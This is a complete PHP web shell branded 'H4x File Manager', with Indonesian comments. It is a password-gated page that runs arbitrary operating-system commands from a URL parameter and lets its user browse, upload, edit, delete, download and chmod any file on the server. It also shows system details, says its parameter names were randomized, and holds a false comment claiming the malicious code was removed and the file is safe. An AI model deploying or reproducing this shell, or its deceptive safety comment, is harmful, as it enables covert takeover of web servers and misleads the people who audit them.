<?php
session_start();
// Konfigurasi login admin
$ADMIN_USER = 'adminsunggal';
$ADMIN_PASS = 'adminsunggal145';

// Proses login
if (isset($_POST['login_admin'])) {
    $user = $_POST['admin_user'] ?? '';
    $pass = $_POST['admin_pass'] ?? '';
    if ($user === $ADMIN_USER && $pass === $ADMIN_PASS) {
        $_SESSION['is_admin'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Username atau password salah!';
    }
}
// Proses logout
if (isset($_GET['logout'])) {
    unset($_SESSION['is_admin']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
// Jika belum login, tampilkan form login saja
if (!isset($_SESSION['is_admin']) || !$_SESSION['is_admin']) {
    echo '<!DOCTYPE html><html><head><title>Admin Login</title><meta name="viewport" content="width=device-width,initial-scale=1">';
    echo '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">';
    echo '<style>body{background:#181c1f;color:#e0e0e0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}';
    echo '.login-box{background:#101215;padding:32px 28px;border-radius:12px;box-shadow:0 0 16px #00ffe733;min-width:320px;}';
    echo '.login-box h2{color:#00ffe7;text-align:center;margin-bottom:18px;text-shadow:0 0 8px #00ffe7;}';
    echo '.login-box input{width:100%;margin-bottom:14px;padding:8px 10px;background:#181c1f;color:#00ffe7;border:1.5px solid #00ffe7;border-radius:5px;font-size:1em;}';
    echo '.login-box button{width:100%;padding:8px 0;background:none;border:1.5px solid #00ffe7;color:#00ffe7;border-radius:5px;font-size:1.1em;cursor:pointer;transition:0.2s;box-shadow:0 0 8px #00ffe733;}';
    echo '.login-box button:hover{background:#00ffe7;color:#181c1f;box-shadow:0 0 16px #00ffe7;}';
    echo '.login-box .err{color:#ff4b4b;text-align:center;margin-bottom:10px;}';
    echo '</style></head><body>';
    echo '<form class="login-box" method="post">';
    echo '<h2><i class="fa fa-user-shield"></i> Admin Login</h2>';
    if (!empty($login_error)) echo '<div class="err">' . htmlspecialchars($login_error) . '</div>';
    echo '<input type="text" name="admin_user" placeholder="Username" autocomplete="off" required autofocus>';
    echo '<input type="password" name="admin_pass" placeholder="Password" autocomplete="off" required>';
    echo '<button type="submit" name="login_admin"><i class="fa fa-sign-in-alt"></i> Login</button>';
    echo '</form></body></html>';
    exit;
}

function executeCommand($input) {
    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w") 
    );

    $process = proc_open($input, $descriptors, $pipes);

    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $errorOutput = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $exitCode = proc_close($process);

        if ($exitCode === 0) {
            return $output;
        } else {
            return "Error: " . $errorOutput;
        }
    } else {
        return "Tidak dapat menjalankan perintah\n";
    }
}


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


function delete_file($file) {
    if (file_exists($file)) {
        if (is_dir($file)) {
            // Hapus folder beserta isinya
            $files = array_diff(scandir($file), array('.', '..'));
            foreach ($files as $f) {
                $path = "$file/$f";
                if (is_dir($path)) {
                    delete_file($path);
                } else {
                    unlink($path);
                }
            }
            rmdir($file);
            echo '<div class="alert alert-success">Folder berhasil dihapus: ' . $file . '</div>';
        } else {
            unlink($file);
            echo '<div class="alert alert-success">File berhasil dihapus: ' . $file . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File/Folder tidak ditemukan: ' . $file . '</div>';
    }
}

function create_folder($folder_name) {
    if (!file_exists($folder_name)) {
        mkdir($folder_name);
        echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_name . '</div>';
    } else {
        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_name . '</div>';
    }
}

function rename_file($file, $new_name) {
    $dir = dirname($file);
    $new_file = $dir . '/' . $new_name;
    if (file_exists($file)) {
        if (!file_exists($new_file)) {
            rename($file, $new_file);
            echo '<div class="alert alert-success">File berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">File dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function rename_folder($folder, $new_name) {
    $dir = dirname($folder);
    $new_folder = $dir . '/' . $new_name;
    if (file_exists($folder)) {
        if (!file_exists($new_folder)) {
            rename($folder, $new_folder);
            echo '<div class="alert alert-success">Folder berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">Folder dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">Folder tidak ditemukan: ' . $folder . '</div>';
    }
}

function change_permissions($file, $permissions) {
    if (file_exists($file)) {
        if (chmod($file, octdec($permissions))) {
            echo '<div class="alert alert-success">Izin file berhasil diubah: ' . $file . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal mengubah izin file: ' . $file . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function read_file_content($file) {
    if (file_exists($file)) {
        return file_get_contents($file);
    } else {
        return "File tidak ditemukan: " . $file;
    }
}

function save_file_content($file, $content) {
    if (file_exists($file)) {
        file_put_contents($file, $content);
        echo '<div class="alert alert-success">File berhasil disimpan: ' . $file . '</div>';
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Tambahkan fungsi create_file
function create_file($file_name) {
    if (!file_exists($file_name)) {
        if (file_put_contents($file_name, '') !== false) {
            echo '<div class="alert alert-success">File berhasil dibuat: ' . htmlspecialchars($file_name) . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal membuat file: ' . htmlspecialchars($file_name) . '</div>';
        }
    } else {
        echo '<div class="alert alert-warning">File sudah ada: ' . htmlspecialchars($file_name) . '</div>';
    }
}

// === PARAMETER RANDOMIZATION DAN BASE64 SUPPORT ===
// Parameter baru (acak):
// path -> p
// file_name -> fn
// folder_name -> fdn
// new_name -> nn
// delete -> d
// download -> dl
// edit -> e
// save_file -> sf
// rename_file -> rf
// rename_folder -> rfd
// change_permissions -> cp
// permissions -> prm
// submit (upload) -> up
// create_folder -> cf
// file_content -> fc
// b64 (opsional, 1=pakai base64)

$dir = $_GET['p'] ?? __DIR__;

// Tambahkan pembacaan isi direktori agar $folders dan $files terisi
$folders = [];
$files = [];
if (is_dir($dir) && $handle = opendir($dir)) {
    while (false !== ($file = readdir($handle))) {
        if ($file != "." && $file != "..") {
            $full_path = $dir . '/' . $file;
            if (is_dir($full_path)) {
                $folders[] = $file;
            } else {
                $files[] = $file;
            }
        }
    }
    closedir($handle);
    natsort($folders);
    natsort($files);
}

// Tambahkan auto reload setelah operasi berhasil
if (isset($_POST['up'])) {
    $file_name = $_FILES['fn']['name'];
    $file_tmp = $_FILES['fn']['tmp_name'];
    if (move_uploaded_file($file_tmp, $dir . '/' . $file_name)) {
        echo '<script>alert("File berhasil diupload!"); window.location.href="?p=' . urlencode($dir) . '";</script>';
    }
}

if (isset($_POST['cf'])) {
    create_folder($dir . '/' . $_POST['fdn']);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_POST['cf2'])) {
    create_file($dir . '/' . $_POST['fn2']);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_GET['d'])) {
    delete_file($dir . '/' . $_GET['d']);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_POST['rf'])) {
    rename_file($dir . '/' . $_POST['fn'], $_POST['nn']);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_POST['rfd'])) {
    rename_folder($dir . '/' . $_POST['fdn'], $_POST['nn']);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_POST['cp'])) {
    change_permissions($dir . '/' . $_POST['fn'], $_POST['prm']);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_POST['sf'])) {
    $file_name = $_POST['fn'];
    $file_content = $_POST['fc'];
    if (isset($_POST['b64']) && $_POST['b64'] == '1') {
        $file_content = base64_decode($file_content);
    }
    save_file_content($dir . '/' . $file_name, $file_content);
    echo '<script>setTimeout(function(){ window.location.href="?p=' . urlencode($dir) . '"; }, 1000);</script>';
}

if (isset($_GET['dl'])) {
    $file = $dir . '/' . $_GET['dl'];
    if (file_exists($file)) {
        if (isset($_GET['b64']) && $_GET['b64'] == '1') {
            header('Content-Type: text/plain');
            echo base64_encode(file_get_contents($file));
        } else {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            ob_clean();
            flush();
            readfile($file);
        }
        exit;
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . htmlspecialchars($file) . '</div>';
    }
}

function display_path_links($path) {
    $parts = explode('/', $path);
    $accumulated_path = '';
    foreach ($parts as $part) {
        if ($part) {
            $accumulated_path .= '/' . $part;
            echo '<a href="?p=' . urlencode($accumulated_path) . '">' . htmlspecialchars($part) . '</a>/';
        }
    }
}

// Proses terminal command
$terminal_output = '';
if (isset($_GET['c']) && strlen(trim($_GET['c'])) > 0) {
    $cmd = trim($_GET['c']);
    $terminal_output = executeCommand($cmd);
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager | Team IT Suka Suka</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: #181c1f;
            color: #e0e0e0;
            font-family: 'Fira Mono', 'Consolas', 'Courier New', monospace;
            margin: 0;
        }
        .main-wrapper {
            display: flex;
            min-height: 100vh;
        }
        .sidebar {
            width: 240px;
            background: #101215;
            color: #00ffe7;
            padding: 32px 18px 18px 18px;
            box-shadow: 2px 0 12px #00ffe733;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            border-right: 2px solid #00ffe7;
        }
        .sidebar h2 {
            font-size: 1.3em;
            font-weight: 700;
            margin-bottom: 32px;
            color: #00ffe7;
            text-shadow: 0 0 8px #00ffe7;
            letter-spacing: 2px;
        }
        .sidebar .info {
            font-size: 0.98em;
            margin-bottom: 18px;
            color: #b8ffe7;
        }
        .sidebar .info strong {
            color: #fff;
        }
        .container {
            flex: 1;
            background: #181c1f;
            padding: 36px 48px 36px 48px;
            min-width: 0;
        }
        h1 {
            color: #00ffe7;
            font-weight: 700;
            font-size: 1.7em;
            margin-bottom: 18px;
            letter-spacing: 2px;
            text-shadow: 0 0 8px #00ffe7;
        }
        .path-links {
            margin-bottom: 18px;
            font-size: 1.1em;
            color: #b8ffe7;
        }
        .file-list {
            width: 100%;
            background: #101215;
            border-radius: 10px;
            box-shadow: 0 1px 8px #00ffe733;
            margin-bottom: 32px;
            padding: 0;
        }
        .file-row, .folder-row {
            display: flex;
            align-items: center;
            border-bottom: 1px solid #222b2f;
            padding: 0.7em 0.5em;
            font-size: 1em;
        }
        .file-row:last-child, .folder-row:last-child {
            border-bottom: none;
        }
        .file-row .fa-file, .folder-row .fa-folder {
            margin-right: 12px;
            font-size: 1.1em;
        }
        .folder-row .fa-folder { color: #00ffe7; text-shadow: 0 0 6px #00ffe7; }
        .file-row .fa-file { color: #b8ffe7; }
        .filename {
            flex: 1;
            color: #fff;
            text-decoration: none;
            transition: color 0.2s;
        }
        .filename:hover { color: #00ffe7; }
        .permissions {
            font-family: monospace;
            color: #00ff6a;
            width: 90px;
            text-align: center;
            font-size: 0.98em;
        }
        .actions {
            display: flex;
            gap: 8px;
        }
        .neon-btn {
            background: none;
            border: 1.5px solid #00ffe7;
            color: #00ffe7;
            border-radius: 5px;
            padding: 2px 10px;
            font-family: inherit;
            font-size: 1em;
            cursor: pointer;
            transition: box-shadow 0.2s, background 0.2s, color 0.2s;
            box-shadow: 0 0 8px #00ffe733;
        }
        .neon-btn:hover {
            background: #00ffe7;
            color: #181c1f;
            box-shadow: 0 0 16px #00ffe7;
        }
        .custom-form {
            background: #101215;
            border-radius: 10px;
            padding: 18px 16px;
            margin-bottom: 18px;
            box-shadow: 0 1px 8px #00ffe733;
        }
        .custom-form label {
            color: #00ffe7;
            font-weight: 600;
        }
        .custom-form input, .custom-form textarea {
            background: #181c1f;
            color: #00ffe7;
            border: 1px solid #00ffe7;
            border-radius: 4px;
            font-family: inherit;
        }
        .custom-form input:focus, .custom-form textarea:focus {
            outline: none;
            border-color: #00ff6a;
            box-shadow: 0 0 8px #00ff6a;
        }
        .terminal-label {
            color: #00ff6a;
            font-weight: 600;
            font-size: 1.1em;
            text-shadow: 0 0 6px #00ff6a;
        }
        .rename-form, .chmod-form {
            display: none;
            margin-top: 6px;
        }
        .alert {
            font-size: 1em;
            background: #181c1f;
            color: #ff4b4b;
            border: 1px solid #ff4b4b;
            border-radius: 5px;
            margin: 8px 0;
            padding: 8px 12px;
        }
        .alert-success { color: #00ff6a; border-color: #00ff6a; }
        .alert-warning { color: #ffe600; border-color: #ffe600; }
        .alert-danger { color: #ff4b4b; border-color: #ff4b4b; }
        footer {
            margin-top: 32px;
            color: #b8ffe7;
            text-align: right;
            font-size: 0.95em;
        }
        ::selection { background: #00ffe7; color: #181c1f; }
    </style>
    <script>
        function confirmChmod(form) {
            if (confirm('Apakah Anda yakin ingin mengubah izin file ini?')) {
                form.submit();
            }
        }
        function toggleRenameForm(id) {
            var form = document.getElementById(id);
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
        }
        function toggleChmodForm(id) {
            var form = document.getElementById(id);
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
        }
    </script>
</head>
<body>
<div class="main-wrapper">
    <div class="sidebar">
        <h2><i class="fa-solid fa-terminal"></i> H4x FileMgr</h2>
        <div class="info"><strong>Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></div>
        <div class="info"><strong>System:</strong> <?php echo php_uname(); ?></div>
        <div class="info"><strong>User:</strong> <?php echo get_current_user(); ?> (<?php echo getmyuid(); ?>)</div>
        <div class="info"><strong>PHP:</strong> <?php echo phpversion(); ?></div>
        <div class="info"><strong>Dir:</strong><br><?php display_path_links($dir); ?></div>
        <a href="?logout=1" class="neon-btn mt-4" style="margin-top:24px;"><i class="fa fa-sign-out-alt"></i> Logout</a>
    </div>
    <div class="container">
        <h1>H4x File Manager</h1>
        <div class="path-links">Path: <?php display_path_links($dir); ?></div>
        <div class="file-list">
        <?php
        foreach ($folders as $folder) {
            $full_path = $dir . '/' . $folder;
            $permissions = get_permissions($full_path);
            echo '<div class="folder-row">';
            echo '<i class="fa-solid fa-folder"></i>';
            echo '<a class="filename" href="?p=' . urlencode($full_path) . '">' . htmlspecialchars($folder) . '</a>';
            echo '<span class="permissions">' . $permissions . '</span>';
            echo '<div class="actions">';
            echo '<button class="neon-btn" title="Rename" onclick="toggleRenameForm(\'rename-folder-' . htmlspecialchars($folder) . '\')"><i class="fa fa-edit"></i></button>';
            echo '<form method="post" class="rename-form" id="rename-folder-' . htmlspecialchars($folder) . '"><input type="hidden" name="fdn" value="' . htmlspecialchars($folder) . '"><input type="text" name="nn" class="form-control d-inline w-50" placeholder="New name"><button type="submit" name="rfd" class="neon-btn">Save</button></form>';
            echo '<a href="?p=' . urlencode($dir) . '&d=' . urlencode($folder) . '" class="neon-btn" title="Delete"><i class="fa fa-trash"></i></a>';
            echo '</div></div>';
        }
        foreach ($files as $file) {
            $full_path = $dir . '/' . $file;
            $permissions = get_permissions($full_path);
            echo '<div class="file-row">';
            echo '<i class="fa-solid fa-file"></i>';
            echo '<span class="filename">' . htmlspecialchars($file) . '</span>';
            echo '<span class="permissions">' . $permissions . '</span>';
            echo '<div class="actions">';
            echo '<a href="?p=' . urlencode($dir) . '&dl=' . urlencode($file) . '&b64=1" class="neon-btn" title="Download (base64)"><i class="fa fa-download"></i></a>';
            echo '<a href="?p=' . urlencode($dir) . '&d=' . urlencode($file) . '" class="neon-btn" title="Delete"><i class="fa fa-trash"></i></a>';
            echo '<button class="neon-btn" title="Chmod" onclick="toggleChmodForm(\'chmod-file-' . htmlspecialchars($file) . '\')"><i class="fa fa-key"></i></button>';
            echo '<form method="post" class="chmod-form" id="chmod-file-' . htmlspecialchars($file) . '" onsubmit="event.preventDefault(); confirmChmod(this);"><input type="hidden" name="fn" value="' . htmlspecialchars($file) . '"><input type="text" name="prm" class="form-control d-inline w-50" placeholder="0755"><button type="submit" name="cp" class="neon-btn">Save</button></form>';
            echo '<button class="neon-btn" title="Rename" onclick="toggleRenameForm(\'rename-file-' . htmlspecialchars($file) . '\')"><i class="fa fa-edit"></i></button>';
            echo '<form method="post" class="rename-form" id="rename-file-' . htmlspecialchars($file) . '"><input type="hidden" name="fn" value="' . htmlspecialchars($file) . '"><input type="text" name="nn" class="form-control d-inline w-50" placeholder="New name"><button type="submit" name="rf" class="neon-btn">Save</button></form>';
            echo '<form method="get" class="d-inline"><input type="hidden" name="e" value="' . htmlspecialchars($file) . '"><button type="submit" class="neon-btn" title="Edit"><i class="fa fa-pen"></i></button></form>';
            echo '</div></div>';
        }
        ?>
        </div>
        <form method="post" class="custom-form">
            <div class="form-group">
                <label>Buat Folder Baru</label>
                <input type="text" name="fdn" class="form-control" placeholder="Folder name">
            </div>
            <button type="submit" name="cf" class="neon-btn" style="width:100%;margin-top:8px;"><i class="fa fa-folder-plus"></i> Create Folder</button>
        </form>
        <form method="post" enctype="multipart/form-data" class="custom-form">
            <div class="form-group">
                <label>Upload File</label>
                <input type="file" name="fn" class="form-control-file">
            </div>
            <button type="submit" name="up" class="neon-btn" style="width:100%;margin-top:8px;"><i class="fa fa-upload"></i> Upload</button>
        </form>
        <form method="post" class="custom-form">
            <div class="form-group">
                <label>Buat File Baru</label>
                <input type="text" name="fn2" class="form-control" placeholder="File name">
            </div>
            <button type="submit" name="cf2" class="neon-btn" style="width:100%;margin-top:8px;"><i class="fa fa-file-circle-plus"></i> Create File</button>
        </form>
        <div class="custom-form">
            <span class="terminal-label"><i class="fa fa-terminal"></i> Terminal</span>
            <form method="get" action="">
                <div class="form-group">
                    <label for="command">Command:</label>
                    <input type="text" name="c" id="command" class="form-control" placeholder="Enter your command" value="<?php echo isset($_GET['c']) ? htmlspecialchars($_GET['c']) : '' ?>">
                </div>
                <button type="submit" class="neon-btn" style="width:100%;margin-top:8px;"><i class="fa fa-play"></i> Execute</button>
            </form>
            <?php if ($terminal_output !== ''): ?>
            <div style="background:#181c1f;color:#00ff6a;font-family:monospace;padding:14px 12px;margin-top:12px;border-radius:8px;box-shadow:0 0 8px #00ffe733;white-space:pre-wrap;word-break:break-all;max-height:350px;overflow:auto;">
                <b style="color:#ffe600;">$ <?php echo htmlspecialchars($_GET['c']); ?></b>
                <br><?php echo nl2br(htmlspecialchars($terminal_output)); ?>
            </div>
            <?php endif; ?>
        </div>
        <?php
        if (isset($_GET['e'])) {
            $file_to_edit = $dir . '/' . $_GET['e'];
            $file_content = read_file_content($file_to_edit);
            echo '<div class="custom-form my-4"><h2 style="color:#00ffe7;text-shadow:0 0 8px #00ffe7;">Edit File: ' . htmlspecialchars($_GET['e']) . '</h2><form method="post"><input type="hidden" name="fn" value="' . htmlspecialchars($_GET['e']) . '"><div class="form-group"><textarea name="fc" class="form-control" rows="24" style="font-family:inherit;background:#181c1f;color:#00ffe7;font-size:1.15em;width:100%;min-height:420px;resize:vertical;">' . htmlspecialchars($file_content) . '</textarea></div><input type="hidden" name="b64" value="1"><button type="submit" name="sf" class="neon-btn" style="width:100%;margin-top:8px;"><i class="fa fa-save"></i> Save</button></form></div>';
        }
        ?>
        <footer class="mt-4">
            <p>© 2024 Team IT Suka Suka</p>
        </footer>
    </div>
</div>
</body>
</html>
